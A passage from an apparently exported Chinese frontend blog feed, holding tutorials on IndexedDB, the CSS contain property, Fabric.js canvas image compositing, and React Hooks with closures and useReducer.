<li>数据操作是异步的：使用 IndexedDB 执行的操作是异步执行的，以免阻塞应用程序。<h5 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var dbName &#x3D; &quot;my_db&quot;;</span><br><span class="line"></span><br><span class="line">var request &#x3D; indexedDB.open(dbName, 2);</span><br><span class="line"></span><br><span class="line">request.onerror &#x3D; function(event) &#123;</span><br><span class="line">  &#x2F;&#x2F; 错误处理</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded &#x3D; function(event) &#123;</span><br><span class="line">  var db &#x3D; event.target.result;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 建立一个对象仓库来存储我们客户的相关信息，我们选择 ssn 作为键路径（key path）</span><br><span class="line">  &#x2F;&#x2F; 因为 ssn 可以保证是不重复的</span><br><span class="line">  var objectStore &#x3D; db.createObjectStore(&quot;customers&quot;, &#123; keyPath: &quot;ssn&quot; &#125;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 建立一个索引来通过姓名来搜索客户。名字可能会重复，所以我们不能使用 unique 索引</span><br><span class="line">  objectStore.createIndex(&quot;name&quot;, &quot;name&quot;, &#123; unique: false &#125;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 使用邮箱建立索引，我们确保客户的邮箱不会重复，所以我们使用 unique 索引</span><br><span class="line">  objectStore.createIndex(&quot;email&quot;, &quot;email&quot;, &#123; unique: true &#125;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 使用事务的 oncomplete 事件确保在插入数据前对象仓库已经创建完毕</span><br><span class="line">  objectStore.transaction.oncomplete &#x3D; function(event) &#123;</span><br><span class="line">    &#x2F;&#x2F; 将数据保存到新创建的对象仓库</span><br><span class="line">    var customerObjectStore &#x3D; db.transaction(&quot;customers&quot;, &quot;readwrite&quot;).objectStore(&quot;customers&quot;);</span><br><span class="line">    customerData.forEach(function(customer) &#123;</span><br><span class="line">      customerObjectStore.add(customer);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>CSS新特性contain，控制页面的重绘与重排</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/CSS%E6%96%B0%E7%89%B9%E6%80%A7contain%EF%BC%8C%E6%8E%A7%E5%88%B6%E9%A1%B5%E9%9D%A2%E7%9A%84%E9%87%8D%E7%BB%98%E4%B8%8E%E9%87%8D%E6%8E%92/</url>
    <content><![CDATA[<h2 id="contain-为何？"><a href="#contain-为何？" class="headerlink" title="contain 为何？"></a><code>contain</code> 为何？</h2><p><code>contain</code> 属性允许我们指定特定的 DOM 元素和它的子元素，让它们能够独立于整个 DOM 树结构之外。目的是能够让浏览器有能力只对部分元素进行重绘、重排，而不必每次都针对整个页面。</p>
<blockquote>
<p>The contain property allows an author to indicate that an element and its contents are, as much as possible, independent of the rest of the document tree. This allows the browser to recalculate layout, style, paint, size, or any combination of them for a limited area of the DOM and not the entire page.</p>
</blockquote>
<h2 id="contain-语法"><a href="#contain-语法" class="headerlink" title="contain 语法"></a><code>contain</code> 语法</h2><p>看看它的语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#x2F;* No layout containment. *&#x2F;</span><br><span class="line">  contain: none;</span><br><span class="line">  &#x2F;* Turn on size containment for an element. *&#x2F;</span><br><span class="line">  contain: size;</span><br><span class="line">  &#x2F;* Turn on layout containment for an element. *&#x2F;</span><br><span class="line">  contain: layout;</span><br><span class="line">  &#x2F;* Turn on style containment for an element. *&#x2F;</span><br><span class="line">  contain: style;</span><br><span class="line">  &#x2F;* Turn on paint containment for an element. *&#x2F;</span><br><span class="line">  contain: paint;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Turn on containment for layout, paint, and size. *&#x2F;</span><br><span class="line">  contain: strict;</span><br><span class="line">  &#x2F;* Turn on containment for layout, and paint. *&#x2F;</span><br><span class="line">  contain: content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除去 <code>none</code>，取值还有 6 个，我们一个一个来看看。</p>
<h2 id="contain-size"><a href="#contain-size" class="headerlink" title="contain: size"></a>contain: size</h2><p>contain: size: 设定了 <code>contain: size</code> 的元素的渲染不会受到其子元素内容的影响。</p>
<blockquote>
<p>The value turns on size containment for the element. This ensures that the containing box can be laid out without needing to examine its descendants.</p>
</blockquote>
<p>我开始看到这个定义也是一头雾水，光看定义很难明白到底是什么意思。还需实践一番：</p>
<p>假设我们有如下简单结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.container &#123;</span><br><span class="line">    width: 300px;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p &#123;</span><br><span class="line">    border: 1px solid #333;</span><br><span class="line">    margin: 5px;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且，借助 jQuery 实现每次点击容器添加一个 <code>&lt;p&gt;Coco&lt;/p&gt;</code> 结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(&#39;.container&#39;).on(&#39;click&#39;, e &#x3D;&gt; &#123;</span><br><span class="line">    $(&#39;.container&#39;).append(&#39;&lt;p&gt;Coco&lt;&#x2F;p&gt;&#39;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>那么会得到如下结果：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0e816a00adab35e5.gif?imageMogr2/auto-orient/strip"></p>
<p>可以看到，容器 <code>.container</code> 的高度是会随着元素的增加而增加的，这是正常的现象。</p>
<p>此刻，我们给容器 <code>.container</code> 添加一个 <code>contain: size</code>，也就会出现上述说的：<strong>设定了 <code>contain: size</code> 的元素的渲染不会受到其子元素内容的影响</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.container &#123;</span><br><span class="line">    width: 300px;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line">+   contain: size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看看会发生什么：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4eafd75af8365e03.gif?imageMogr2/auto-orient/strip"></p>
<p>正常而言，父元素的高度会因为子元素的增多而被撑高，而现在，子元素的变化不再影响父元素的样式布局，这就是 <code>contain: size</code> 的作用。</p>
<h2 id="contain-style"><a href="#contain-style" class="headerlink" title="contain: style"></a>contain: style</h2><p>接下来再说说 <code>contain: style</code>、<code>contain: layout</code> 、<code>contain: paint</code>。先看看 contain: style。</p>
<p>截止至本文书写的过程中，<code>contain: style</code> 暂时被移除了。</p>
<blockquote>
<p><a href="https://www.w3.org/TR/css-contain-1/">CSS Containment Module Level 1</a>: Drop the at-risk “style containment” feature from this specification, move it Level 2。</p>
</blockquote>
<p>嗯，官方说辞是因为存在某些风险，暂时被移除，可能在规范的第二版会重新定义吧，那这个属性也暂且放一放。</p>
<h2 id="contain-paint"><a href="#contain-paint" class="headerlink" title="contain: paint"></a>contain: paint</h2><p>contain: paint：设定了 <code>contain: paint</code> 的元素即是设定了布局限制，也就是说告知 User Agent，此元素的子元素不会在此元素的边界之外被展示，因此，如果元素不在屏幕上或以其他方式设定为不可见，则还可以保证其后代不可见不被渲染。</p>
<blockquote>
<p>This value turns on paint containment for the element. This ensures that the descendants of the containing box don’t display outside its bounds, so if an element is off-screen or otherwise not visible, its descendants are also guaranteed to be not visible.</p>
</blockquote>
<p>这个稍微好理解一点，先来看第一个特性：</p>
<h3 id="设定了-contain-paint-的元素的子元素不会在此元素的边界之外被展示"><a href="#设定了-contain-paint-的元素的子元素不会在此元素的边界之外被展示" class="headerlink" title="设定了 contain: paint 的元素的子元素不会在此元素的边界之外被展示"></a>设定了 <code>contain: paint</code> 的元素的子元素不会在此元素的边界之外被展示</h3><ul>
<li>  设定了 <code>contain: paint</code> 的元素的子元素不会在此元素的边界之外被展示</li>
</ul>
<p>这个特点有点类似与 <code>overflow: hidden</code>，也就是明确告知用户代理，子元素的内容不会超出元素的边界，所以超出部分无需渲染。</p>
<p>简单示例，假设元素结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;p&gt;Coco&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.container &#123;</span><br><span class="line">    contain: paint;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p&#123;</span><br><span class="line">    left: -100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来看看，设定了 <code>contain: paint</code> 与没设定时会发生什么：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-40d071c4e009dc68.gif?imageMogr2/auto-orient/strip"></p>
<p><a href="https://codepen.io/Chokcoco/pen/KKwmgmN">CodePen Demo – contain: paint Demo</a>点击预览 </p>
<h3 id="设定了-contain-paint-的元素在屏幕之外时不会渲染绘制"><a href="#设定了-contain-paint-的元素在屏幕之外时不会渲染绘制" class="headerlink" title="设定了 contain: paint 的元素在屏幕之外时不会渲染绘制"></a>设定了 <code>contain: paint</code> 的元素在屏幕之外时不会渲染绘制</h3><p>通过使用 <code>contain: paint</code>， 如果元素处于屏幕外，那么用户代理就会忽略渲染这些元素，从而能更快的渲染其它内容。</p>
<h2 id="contain-layout"><a href="#contain-layout" class="headerlink" title="contain: layout"></a>contain: layout</h2><p>contain: layout：设定了 <code>contain: layout</code> 的元素即是设定了布局限制，也就是说告知 User Agent，此元素内部的样式变化不会引起元素外部的样式变化，反之亦然。</p>
<blockquote>
<p>This value turns on layout containment for the element. This ensures that the containing box is totally opaque for layout purposes; nothing outside can affect its internal layout, and vice versa.</p>
</blockquote>
<p>启用 <code>contain: layout</code> 可以潜在地将每一帧需要渲染的元素数量减少到少数，而不是重新渲染整个文档，从而为浏览器节省了大量不必要的工作，并显着提高了性能。</p>
<p>使用 <code>contain：layout</code>，开发人员可以指定对该元素任何后代的任何更改都不会影响任何外部元素的布局，反之亦然。</p>
<p>因此，浏览器仅计算内部元素的位置（如果对其进行了修改），而其余DOM保持不变。因此，这意味着帧渲染管道中的布局过程将加快。</p>
<h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>描述很美好，但是在实际 Demo 测试的过程中（截止至2021/04/27，Chrome 90.0.4430.85），仅仅单独使用 <code>contain：layout</code> 并没有验证得到上述那么美好的结果。</p>
<p><strong>设定了 <code>contain: layout</code> 的指定元素，改元素的任何后代的任何更改还是会影响任何外部元素的布局</strong>，点击红框会增加一条 <code>&lt;p&gt;Coco&lt;p&gt;</code> 元素插入到 <code>container</code> 中：</p>
<p>简单的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;p&gt;Coco&lt;&#x2F;p&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;g-test&quot;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">html,</span><br><span class="line">body &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: center;</span><br><span class="line">    align-items: center;</span><br><span class="line">    flex-direction: column;</span><br><span class="line">    gap: 10px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.container &#123;</span><br><span class="line">    width: 150px;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    contain: layout;</span><br><span class="line">    border: 1px solid red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.g-test &#123;</span><br><span class="line">    width: 150px;</span><br><span class="line">    height: 150px;</span><br><span class="line">    border: 1px solid green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9205beded9aa0db4.gif?imageMogr2/auto-orient/strip"></p>
<p><a href="https://codepen.io/Chokcoco/pen/rNjRELL">CodePen Demo – contain: layout Demo</a>点击预览 </p>
<p>目前看来，<code>contain: layout</code> 的实际作用不那么明显，更多的关于它的用法，你可以再看看这篇文章：<a href="https://css-tricks.com/almanac/properties/c/contain/">CSS-tricks - contain</a></p>
<h2 id="contain-strict-contain-content"><a href="#contain-strict-contain-content" class="headerlink" title="contain: strict | contain: content"></a>contain: strict | contain: content</h2><p>这两个属性稍微有点特殊，效果是上述介绍的几个属性的聚合效果：</p>
<ul>
<li>  <code>contain: strict</code>：同时开启 layout、style、paint 以及 size 的功能，它相当于 <code>contain: size layout paint</code></li>
<li>  <code>contain: content</code>：同时开启 layout、style 以及 paint 的功能，它相当于 <code>contain: layout paint</code></li>
</ul>
<p>所以，这里也提一下，contain 属性是可以同时定义几个的。</p>
<h2 id="Can-i-Use-–-CSS-Contain"><a href="#Can-i-Use-–-CSS-Contain" class="headerlink" title="Can i Use – CSS Contain"></a>Can i Use – CSS Contain</h2><p>截止至 2021-04-27，Can i Use 上的 CSS Contain 兼容性，已经可以开始使用起来：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-316f1e66fa903213.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>  <a href="https://www.w3.org/TR/css-contain-1/">CSS Containment Module Level 1</a></li>
<li>  <a href="https://justmarkup.com/articles/2016-04-05-css-containment/">CSS containment</a></li>
<li>  <a href="https://developers.google.com/web/updates/2016/06/css-containment">CSS Containment in Chrome 52</a></li>
</ul>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>好了，本文到此结束，希望对你有帮助 :)</p>
<p>更多精彩 CSS 技术文章汇总在我的 <a href="https://github.com/chokcoco/iCSS">Github – iCSS</a> ，持续更新，欢迎点个 star 订阅收藏。</p>
<p>如果还有什么疑问或者建议，可以多多交流，原创文章，文笔有限，才疏学浅，文中若有不正之处，万望告知。</p>
<blockquote>
<p>原文：<a href="https://segmentfault.com/a/1190000039950464?utm_source=tag-newest">https://segmentfault.com/a/1190000039950464?utm_source=tag-newest</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>canvas前端图片合成-Fabric.js</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/canvas%E5%89%8D%E7%AB%AF%E5%9B%BE%E7%89%87%E5%90%88%E6%88%90-Fabric/</url>
    <content><![CDATA[<p>Fabric.js是一个可以简化Canvas程序编写的库,官方文档地址<a href="http://fabricjs.com/docs/">http://fabricjs.com/docs/</a></p>
<p>暂时只支持纯图片的编辑合成</p>
<h6 id="支持设置画布的大小"><a href="#支持设置画布的大小" class="headerlink" title="支持设置画布的大小"></a>支持设置画布的大小</h6><p><img src="https://upload-images.jianshu.io/upload_images/10024246-e7ecd000a4d55435.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>点击上传背景图片按钮 上传背景图</p>
<p>使用new FileReader()方法，把本地图片转换成base64图片，并且push到data数据中</p>
<p>点击添加画布按钮，push一条新的画布数据，数据是一个对象，包含canvas字段，用来储存Fabric实例，支持图片拖拽的形式把图片添加到画布中</p>
<p>拖动图片的时候使用dragend监听拖拽结束后的事件，在画布中使用dragenter监听鼠标是否进入，如果进入并且拖拽动作结束，获取图片的base64地址并且通过new fabric.Image.fromURL方法添加图片，并且捕获鼠标的坐标减去鼠标距离图片顶部和左边的距离，就得到图片在canvas中具体的位置，通过设置top和left</p>
<p>通过.on()方法监听图片旋转，缩放，方法接受2个参数，第一个为事件名，第二个为回调函数</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>“mouse:down”</td>
<td>鼠标按下时</td>
</tr>
<tr>
<td>“mouse:up”</td>
<td>鼠标抬起时</td>
</tr>
<tr>
<td>“mouse:move”</td>
<td>鼠标移动时</td>
</tr>
<tr>
<td>“object:modified”</td>
<td>对象修改后</td>
</tr>
<tr>
<td>“object:moving”</td>
<td>对象移动</td>
</tr>
<tr>
<td>“object:added”</td>
<td>对象被加入</td>
</tr>
<tr>
<td>“object:selected”</td>
<td>对象被选中</td>
</tr>
<tr>
<td>“object:rotating”</td>
<td>对象被旋转</td>
</tr>
<tr>
<td>“object:scaling”</td>
<td>对象缩放</td>
</tr>
</tbody></table>
<h4 id="判断是否选中对象，使用以下方法调整图片层级"><a href="#判断是否选中对象，使用以下方法调整图片层级" class="headerlink" title="判断是否选中对象，使用以下方法调整图片层级"></a>判断是否选中对象，使用以下方法调整图片层级</h4><table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>bringForward()</td>
<td>图层上移</td>
</tr>
<tr>
<td>sendBackwards()</td>
<td>图层下移</td>
</tr>
<tr>
<td>bringToFront()</td>
<td>图层置顶</td>
</tr>
<tr>
<td>sendToBack()</td>
<td>图层置底</td>
</tr>
</tbody></table>
<h4 id="编辑图片，下面小画布列表也会同时等比例变化"><a href="#编辑图片，下面小画布列表也会同时等比例变化" class="headerlink" title="编辑图片，下面小画布列表也会同时等比例变化"></a>编辑图片，下面小画布列表也会同时等比例变化</h4><p>先获取大画布和小画布的比例，按照画布比例缩放移动小画布图片</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>React Hooks了解一下？超简单入门Hooks</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/ReactHooks%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%EF%BC%9F%E8%B6%85%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8Hooks/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>先简单说一下Hooks是什么，在写React组件时候，有两种写法，一种是类写法，一种就是函数写法，Hooks主要服务的对象还是函数组件，因为函数组件相对类组件有些功能确实不好实现，比如生命周期钩子，Hooks就是让函数组件具有类组件能力的一个东西，Hooks的出现会给我们带来另外一种组件实现思路，一直看到有些小伙伴们问Hooks会不会代替Redux，emmm…我觉得这应该不是一个概念吧，这些小伙伴不必担心。</p>
<p>Tips：按照惯例声明，笔者也是入门级选手，所写文章深度不会达到大佬的文章水平，只希望能对像我一样的入门级小伙伴有所帮助。</p>
</blockquote>
<h2 id="文字说明会很长，只有例子最明了"><a href="#文字说明会很长，只有例子最明了" class="headerlink" title="文字说明会很长，只有例子最明了"></a>文字说明会很长，只有例子最明了</h2><p>先来看一个可以管理状态的组件在React中怎样写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &#39;react&#39;</span><br><span class="line"></span><br><span class="line">class Counter extends React.Component &#123;</span><br><span class="line">    state &#x3D; &#123;</span><br><span class="line">        count: 0</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">        this.interval &#x3D; setInterval(() &#x3D;&gt; &#123;</span><br><span class="line">            this.setState(&#123;</span><br><span class="line">                count: this.state.count + 1</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;, 1000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentWillUnmount() &#123;</span><br><span class="line">        if(this.interval) &#123;</span><br><span class="line">            clearInterval(this.interval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        return (</span><br><span class="line">            &lt;div&gt;count is : &#123;this.state.count&#125;&lt;&#x2F;div&gt;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default Counter;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>以上代码写了一个简单的计数器组件，管理了一个count状态（就是一个名字叫count的数据），在组件加载完成后，执行定时器，将count状态每秒+1，在组件要被卸载之前清除定时器(不清除会一直占用内存，可能导致内存泄漏)。这里添加定时器和卸载定时器都是通过生命周期钩子来实现的，在Hooks引入之前，函数组件无法使用生命周期函数的，所以无法完成上述的状态管理功能。</p>
<p><strong>引入Hooks，让函数组件也可以完成状态管理</strong></p>
<p>先简单使用两个Hooks，下文还会详细介绍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React, &#123;useState, useEffect&#125; from &#39;react&#39;</span><br><span class="line"></span><br><span class="line">function CounterFunc() &#123;</span><br><span class="line">    const [count, setCount] &#x3D; useState(0)</span><br><span class="line"></span><br><span class="line">    useEffect(() &#x3D;&gt; &#123;</span><br><span class="line">        const interval &#x3D; setInterval(() &#x3D;&gt; &#123;</span><br><span class="line">            setCount(c &#x3D;&gt; c + 1)</span><br><span class="line">        &#125;,1000)</span><br><span class="line"></span><br><span class="line">        return () &#x3D;&gt; clearInterval(interval)</span><br><span class="line">    &#125;,[])</span><br><span class="line"></span><br><span class="line">    return (</span><br><span class="line">        &lt;div&gt;count is : &#123;count&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default CounterFunc;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>这里直接上了一段代码，在最开头引入了两个函数:<code>useState</code>和<code>useEffect</code>。</p>
<p>在函数组件CounterFunc中，通过<code>useState(0)</code>来设置count的值，这里<code>useState(0)</code>会返回一个数组，数组第一个元素就是被赋值为0的变量，第二个元素是可以对第一个元素重新设置值得函数。我们这里通过数组解构的方式，将这两个元素分别赋值给<code>count</code>和<code>setCount</code>，(如果不了解ES6的解构赋值，请先查阅阮一峰老师ES6书籍的相关部分)。</p>
<p>我们还用了<code>useEffect()</code>函数，在函数里定义了一个定时器，然后返回了一个函数，在返回的函数中清除了定时器，这个被返回的函数就相当于类组件中的<code>componentWillUnmount()</code>生命周子函数了。而这个<code>useEffect()</code>函数本身又相当于<code>componentDidMount()</code>生命周期函数。</p>
<p>至此我们也能很轻松理解<code>useState</code>其实就相当于类组件中设置state的部分，它返回的数组第二个元素<code>setCount()</code>是一个高阶函数，我们需要传入一个<code>c =&gt; c + 1</code>作为参数，这个高阶函数会将<code>count</code>传进<code>c =&gt; c + 1</code>并将计算后的值重新赋值给count。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9c5d0a962eecdbcf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h2 id="State-Hooks"><a href="#State-Hooks" class="headerlink" title="State Hooks"></a>State Hooks</h2><h3 id="useState"><a href="#useState" class="headerlink" title="useState()"></a>useState()</h3><blockquote>
<p>对于状态管理的Hooks，上面已经介绍了<code>useState()</code>，这里会再加一个<code>useReducer()</code>,<code>useReducer</code>才是基础的状态管理Hook</p>
</blockquote>
<p><strong>useState(0)</strong></p>
<p>对useState传递的0只是对状态设置了一个默认值，状态改变后他就没用了。</p>
<p>它返回的两个元素我想大家应该也都清楚是什么东西了，但是这里要说的是第二个元素，它有两种用法</p>
<ul>
<li>  <code>setCount( 100 )</code>传递一个确定的值</li>
<li>  <code>setCount( c =&gt; c + 1)</code>传递一个函数，我们上面使用的方式</li>
</ul>
<p>这里说明一下我们上面为什么不用<code>setCount( count + 1 )</code>的方式，有兴趣的小伙伴可以试试，这样我们页面的结果始终都是1，而不是预期的1,2,3…… 为什么会发生这种事？这是由于闭包造成的，在state更新后，会重新执行我们创建的函数组件，这时候<code>const [count, setCount] = useState(0)</code>这段代码会重新执行一遍，count每次都会被重置为0，然后更新为1。</p>
<h3 id="闭包插曲："><a href="#闭包插曲：" class="headerlink" title="闭包插曲："></a>闭包插曲：</h3><blockquote>
<p>上面说到了闭包，本来不想单独说闭包，但是想了想，Hooks应该算是走函数式编程的道路吧，在学Hooks时候，我们会遇到很多奇怪的现象，导致小伙伴感觉很难，其实很大程度上跟没掌握好闭包有很大关系。这里就简单说一下。</p>
<p>Tips: 请注意，如果你看别的文章从未搞懂过闭包，别担心，这里我还是有信心让90%看我文章的人搞清楚什么是闭包。有基础的直接跳过！！！</p>
</blockquote>
<p><strong>要说闭包先说作用域</strong></p>
<p>我们这里撇开let,const定义变量的方式，回归初心var 在JavaScript中，ES6出现之前是没有块级作用域的，但是它有个东西叫做函数作用域</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var glob &#x3D; &#39;我是最外层定义的变量&#39;</span><br><span class="line"></span><br><span class="line">function func1() &#123;</span><br><span class="line">    console.log(glob) &#x2F;&#x2F; 这里可以引用上层的变量</span><br><span class="line">    var f1 &#x3D; &#39;我是func1中的变量&#39;</span><br><span class="line"></span><br><span class="line">    function func1_1() &#123;</span><br><span class="line">        var f1_1 &#x3D; &#39;我是函数func1_1中的变量&#39;</span><br><span class="line">        console.log(glob) </span><br><span class="line">        console.log(f1)  &#x2F;&#x2F; 这里可以拿到上一层函数中定义的变量和最外层的变量</span><br><span class="line">    &#125;</span><br><span class="line">    function func1_1() &#123;</span><br><span class="line">        console.log(glob) &#x2F;&#x2F; 这里可以拿到最外层的变量</span><br><span class="line">        console.log(f1_1) &#x2F;&#x2F; 但是拿不到同一级别函数定义的变量</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>上面这代码和注释相信能让大家看懂一点JavaScript中的作用域。一个函数，是不能拿到同级别函数里面定义的变量，但是能拿到父级，爷爷级，爷爷爷级函数定义的变量。我们可以利用这里特性对变量进行封装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function func1(param) &#123;</span><br><span class="line">    var f1 &#x3D; &#39;只让我的子孙拿到的变量‘</span><br><span class="line">    var f2 &#x3D; param; &#x2F;&#x2F; 这里把param赋值给f2，它也只能被自己子孙拿到</span><br><span class="line"></span><br><span class="line">    function func1_1() &#123;</span><br><span class="line">        console.log(f1, f2) &#x2F;&#x2F;都能拿到</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return func1_1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(f1, f2) &#x2F;&#x2F;两个都拿不到，报错</span><br><span class="line"></span><br><span class="line">var res1 &#x3D; func1(&#39;hello&#39;) &#x2F;&#x2F; 你猜他的结果是什么。  </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 它的结果是一个函数，就是我们返回的func1_1这个函数，猜错的自己罚自己，给我点个赞，哈哈哈。</span><br><span class="line"></span><br><span class="line">res1() &#x2F;&#x2F; res1存放的就是返回的func1_1,所以再把它执行一遍 </span><br><span class="line">&#x2F;&#x2F;打印出 &#96;只让我的子孙拿到的变量hello&#96;</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>其实在我们执行func1(‘hello’)之后，func1的生命周期就结束了，本来，它里面定义的f1,f2都应该在它生命周期结束后就再也访问不到了，但是幸运的是，func1_1替他保存下了这两个变量，使得<code>func1还没有死透</code></p>
<p>这样封装变量就是闭包。</p>
<blockquote>
<p>闭包插曲结束</p>
</blockquote>
<h3 id="继续上面的来说"><a href="#继续上面的来说" class="headerlink" title="继续上面的来说"></a>继续上面的来说</h3><p>我们可以通过<code>setCount(c =&gt; c + 1)</code>传入回调函数的方式避免闭包带来的<code>奇怪</code>现象。</p>
<h3 id="useReducer"><a href="#useReducer" class="headerlink" title="useReducer"></a>useReducer</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function countReducer(state, action) &#123;</span><br><span class="line">    switch(action.type) &#123;</span><br><span class="line">        case &#39;add&#39;: </span><br><span class="line">            return state + 1;</span><br><span class="line">        case &#39;minus&#39;: </span><br><span class="line">            return state - 1;</span><br><span class="line">        default:</span><br><span class="line">            return state</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#x2F;&#x2F; const [count, setCount] &#x3D; useState(0)</span><br><span class="line">const [count, dispatchCount] &#x3D; useReducer(countReducer,0);</span><br><span class="line">......</span><br><span class="line">&#x2F;&#x2F; setCount(c &#x3D;&gt; c + 1)</span><br><span class="line">dispatchCount(&#123; type: &#39;add&#39; &#125;)</span><br><span class="line">......</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>首先我们先在CounterFunc外面定义一个reducer,然后更改count的定义，以及count的更新，这里useReducer的使用跟 redux中操作很像，后面会持续更新Redux的使用，请有需要的小伙伴关注一下，顺手给个赞。</p>
<p>要注意的是，<code>useReducer(countReducer,0)</code>的两个参数，第一个是定义的countReducer第二个是默认值。我们接收返回值的第二个元素固定写为dispach，或者这里写的dispachCount的格式。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><blockquote>
